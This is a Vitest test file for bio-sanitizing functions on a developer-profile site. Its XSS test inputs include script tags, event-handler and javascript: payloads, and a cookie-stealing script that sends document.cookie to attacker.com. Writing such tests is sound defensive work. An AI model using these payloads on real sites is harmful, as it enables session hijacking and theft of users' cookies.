import { describe, it, expect } from "vitest";
import { sanitizeBio, sanitizeLeetCodeBio } from "../sanitize-bio";

describe("sanitizeBio", () => {
  describe("XSS Prevention", () => {
    it("should remove script tags", () => {
      const input = "Hello <script>alert('xss')</script> World";
      const result = sanitizeBio(input);
      expect(result).not.toContain("<script>");
      expect(result).not.toContain("alert");
      expect(result).toBe("Hello World");
    });

    it("should remove onclick event handlers", () => {
      const input = '<img src="x" onclick="alert(1)">';
      const result = sanitizeBio(input);
      expect(result).not.toContain("onclick");
      expect(result).not.toContain("alert");
    });

    it("should remove onerror event handlers", () => {
      const input = '<img src="x" onerror="fetch(\'https://attacker.com\')">';
      const result = sanitizeBio(input);
      expect(result).not.toContain("onerror");
      expect(result).not.toContain("fetch");
    });

    it("should remove javascript: protocol in href", () => {
      const input = '<a href="javascript:alert(1)">click</a>';
      const result = sanitizeBio(input);
      expect(result).not.toContain("javascript:");
      expect(result).not.toContain("alert");
      expect(result).toBe("click");
    });

    it("should remove javascript: protocol in src", () => {
      const input = '<img src="javascript:alert(1)">';
      const result = sanitizeBio(input);
      expect(result).not.toContain("javascript:");
    });

    it("should remove data: protocol (XSS vector)", () => {
      const input = '<img src="data:text/html,<script>alert(1)</script>">';
      const result = sanitizeBio(input);
      expect(result).not.toContain("data:");
    });

    it("should handle mixed case event handlers", () => {
      const input = '<img OnErRoR="alert(1)">';
      const result = sanitizeBio(input);
      expect(result).not.toContain("OnErRoR");
      expect(result).not.toContain("alert");
    });

    it("should prevent stored XSS via cookie stealing", () => {
      const xssPayload = "<script>fetch('https://attacker.com/?c='+document.cookie)</script>";
      const result = sanitizeBio(xssPayload);
      expect(result).not.toContain("<script>");
      expect(result).not.toContain("fetch");
      expect(result).not.toContain("document.cookie");
      expect(result).toBe("");
    });
  });

  describe("Safe HTML Formatting", () => {
    it("should preserve bold tags", () => {
      const input = "Hello <b>World</b>";
      const result = sanitizeBio(input);
      expect(result).toContain("<b>");
      expect(result).toContain("</b>");
      expect(result).toContain("Hello");
      expect(result).toContain("World");
    });

    it("should preserve italic tags", () => {
      const input = "This is <i>important</i>";
      const result = sanitizeBio(input);
      expect(result).toContain("<i>");
      expect(result).toContain("</i>");
    });

    it("should preserve em tags", () => {
      const input = "This is <em>emphasized</em>";
      const result = sanitizeBio(input);
      expect(result).toContain("<em>");
      expect(result).toContain("</em>");
    });

    it("should preserve strong tags", () => {
      const input = "This is <strong>strong</strong>";
      const result = sanitizeBio(input);
      expect(result).toContain("<strong>");
      expect(result).toContain("</strong>");
    });

    it("should preserve br tags", () => {
      const input = "Line 1<br>Line 2";
      const result = sanitizeBio(input);
      expect(result).toContain("<br>");
    });
  });

  describe("Character & Format Cleanup", () => {
    it("should remove zero-width characters", () => {
      const input = "Hello‍World"; // Contains zero-width joiner
      const result = sanitizeBio(input);
      expect(result).not.toContain("‍");
      expect(result).toBe("HelloWorld");
    });

    it("should remove bidirectional override characters", () => {
      const input = "Hello‮World"; // Contains right-to-left override
      const result = sanitizeBio(input);
      expect(result).not.toContain("‮");
    });

    it("should collapse multiple spaces to single space", () => {
      const input = "Hello    World";
      const result = sanitizeBio(input);
      expect(result).toBe("Hello World");
    });

    it("should trim leading and trailing whitespace", () => {
      const input = "   Hello World   ";
      const result = sanitizeBio(input);
      expect(result).toBe("Hello World");
      expect(result).not.toMatch(/^\s/);
      expect(result).not.toMatch(/\s$/);
    });

    it("should handle multiple newlines", () => {
      const input = "Line 1\n\n\nLine 2";
      const result = sanitizeBio(input);
      expect(result).toBe("Line 1 Line 2");
    });
  });

  describe("Length Limits", () => {
    it("should enforce 500 character limit", () => {
      const input = "a".repeat(600);
      const result = sanitizeBio(input);
      expect(result.length).toBeLessThanOrEqual(500);
      expect(result).toBe("a".repeat(500));
    });

    it("should handle exactly 500 characters", () => {
      const input = "a".repeat(500);
      const result = sanitizeBio(input);
      expect(result).toBe("a".repeat(500));
      expect(result.length).toBe(500);
    });
  });

  describe("Edge Cases", () => {
    it("should handle empty string", () => {
      expect(sanitizeBio("")).toBe("");
    });

    it("should handle null-like values", () => {
      expect(sanitizeBio(null as any)).toBe("");
    });

    it("should handle undefined", () => {
      expect(sanitizeBio(undefined as any)).toBe("");
    });

    it("should handle non-string input", () => {
      expect(sanitizeBio(123 as any)).toBe("");
    });

    it("should preserve normal text without HTML", () => {
      const input = "I love LeetCode and algorithms";
      const result = sanitizeBio(input);
      expect(result).toBe(input);
    });

    it("should handle nested tags", () => {
      const input = "<div><script>alert(1)</script></div>";
      const result = sanitizeBio(input);
      expect(result).not.toContain("<script>");
      expect(result).not.toContain("<div>");
    });
  });

  describe("Real-world Scenarios", () => {
    it("should handle github profile bio example", () => {
      const input = "Full-stack dev @ <b>TechCorp</b> | <i>Open source enthusiast</i>";
      const result = sanitizeBio(input);
      expect(result).toContain("<b>");
      expect(result).toContain("<i>");
      expect(result).not.toContain("TechCorp>");
      expect(result).toContain("Full-stack dev");
    });

    it("should handle unicode emoji", () => {
      const input = "😀 Happy developer 🚀";
      const result = sanitizeBio(input);
      expect(result).toBe("😀 Happy developer 🚀");
    });

    it("should remove iframe injection", () => {
      const input = '<iframe src="https://evil.com"></iframe>';
      const result = sanitizeBio(input);
      expect(result).not.toContain("<iframe>");
      expect(result).not.toContain("evil.com");
    });
  });
});

describe("sanitizeLeetCodeBio", () => {
  it("should remove ALL HTML tags from LeetCode data", () => {
    const input = "Solved <b>1000+</b> problems <i>on LeetCode</i>";
    const result = sanitizeLeetCodeBio(input);
    expect(result).not.toContain("<b>");
    expect(result).not.toContain("<i>");
    expect(result).toBe("Solved 1000+ problems on LeetCode");
  });

  it("should prevent LeetCode-origin XSS", () => {
    const input = "Check this: <script>alert('hacked')</script>";
    const result = sanitizeLeetCodeBio(input);
    // Script tags removed, preventing code execution
    expect(result).not.toContain("<script>");
    expect(result).not.toContain("</script>");
    // Content is safe to display (no executable code)
    expect(result).toBe("Check this: alert('hacked')");
  });

  it("should enforce character limit", () => {
    const input = "x".repeat(600);
    const result = sanitizeLeetCodeBio(input);
    expect(result.length).toBeLessThanOrEqual(500);
  });

  it("should handle empty input", () => {
    expect(sanitizeLeetCodeBio("")).toBe("");
  });

  it("should preserve plain text", () => {
    const input = "Passionate about algorithms and problem solving";
    const result = sanitizeLeetCodeBio(input);
    expect(result).toBe(input);
  });
});
